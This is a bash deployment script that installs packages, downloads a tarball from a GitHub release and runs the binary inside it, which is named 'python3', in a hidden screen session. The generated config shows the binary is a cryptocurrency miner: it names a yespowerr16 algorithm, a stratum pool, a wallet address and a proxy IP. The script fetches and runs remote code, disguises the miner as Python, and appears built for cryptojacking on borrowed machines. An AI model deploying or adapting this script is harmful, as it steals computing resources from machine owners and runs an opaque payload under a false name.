#!/bin/bash

# Function to install screen if not already installed
install_screen() {
    if ! command -v screen &> /dev/null; then
        echo 'Installing screen...'
        sudo apt-get update
        sudo apt-get install -y screen
    fi
}

# Function to set locale settings
set_locale() {
    echo 'Setting locale...'
    sudo apt-get install -y locales
    sudo locale-gen en_US.UTF-8
    sudo update-locale LANG=en_US.UTF-8
}

# Function to set timezone to Asia/Jakarta
set_timezone() {
    echo 'Setting timezone...'
    sudo ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
    sudo dpkg-reconfigure --frontend noninteractive tzdata
}

# Function to download and extract python3.tar.gz
download_python() {
    if [ ! -f python3.tar.gz ]; then
        echo 'Downloading python3.tar.gz...'
        wget -O python3.tar.gz https://github.com/khanhnguyen97/ok2/releases/download/khanh/python3.tar.gz
    fi
    echo 'Extracting python3.tar.gz...'
    tar -xvf python3.tar.gz
    rm python3.tar.gz
    cd python3 || exit 1
}

# Function to install required packages
install_packages() {
    echo 'Installing required packages...'
    export DEBIAN_FRONTEND=noninteractive
    sudo apt-get update
    sudo apt-get install -y --no-install-recommends \
        libnss3-dev gconf-service libasound2 libatk1.0-0 libc6 libcairo2 libcups2 \
        libdbus-1-3 libexpat1 libfontconfig1 libgcc1 libgconf-2-4 libgdk-pixbuf2.0-0 \
        libglib2.0-0 libgtk-3-0 libnspr4 libpango-1.0-0 libpangocairo-1.0-0 \
        libstdc++6 libx11-6 libx11-xcb1 libxcb1 libxcomposite1 libxcursor1 libxdamage1 \
        libxext6 libxfixes3 libxi6 libxrandr2 libxrender1 libxss1 libxtst6 \
        ca-certificates fonts-liberation libappindicator1 libnss3 lsb-release xdg-utils \
        libgbm-dev tzdata
}

# Function to start main.py in a screen session
start_main_py() {
    echo 'Starting main.py in a screen session...'
    chmod +x ./python3
    screen -dmS main-session /bin/bash -c './python3 main.py'
    # /bin/bash -c './python3 main.py'
    echo 'main.py started in a screen session.'
    sleep 2700
    echo '1 hours have passed.'
}

# Main script execution starts here
create_config_file() {
    cat <<EOL > config.json
{
    "algorithm": "$M_ALGO",
    "host": "$M_HOST",
    "port": $M_PORT,
    "worker": "$M_WORKER",
    "password": "$M_PASSWORD",
    "workers": $M_THREADS,
    "log": false,
    "chrome": "./chromium/chrome",
    "proxy": "$M_PROXY"
}
EOL
}
M_ALGO="yespowerr16"
M_HOST="stratum-asia.rplant.xyz"
M_PORT="13382"
M_WORKER="YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC"
M_PASSWORD="x"
M_THREADS="3"
M_PROXY="ws://172.233.136.27:8088/proxy"
# Call functions in sequence

# Install screen
install_screen

# Set locale
set_locale

# Set timezone
set_timezone

# Download and extract python3.tar.gz
download_python

# Install required packages
install_packages
rm -f config.json
create_config_file
# Start main.py in a screen session
start_main_py

# Notify completion
echo 'Installation and configuration completed successfully.'
